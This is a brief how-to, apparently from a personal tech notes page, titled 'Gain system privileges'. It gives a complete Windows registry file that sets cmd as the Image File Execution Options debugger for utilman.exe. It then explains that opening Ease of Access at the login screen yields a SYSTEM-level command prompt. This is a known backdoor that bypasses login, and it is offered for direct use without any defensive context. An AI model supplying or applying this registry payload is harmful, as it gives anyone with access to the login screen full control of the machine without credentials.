# Gain system privileges

The following registry script will attach `cmd` as a debugger to `utilman.exe`.

```reg title='utilman-attach-debugger.reg'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe]
"Debugger"="cmd /c start cmd"
```

When you now restart your computer and start up Ease of Access before logging in, you'll get a cmd window with system privileges.
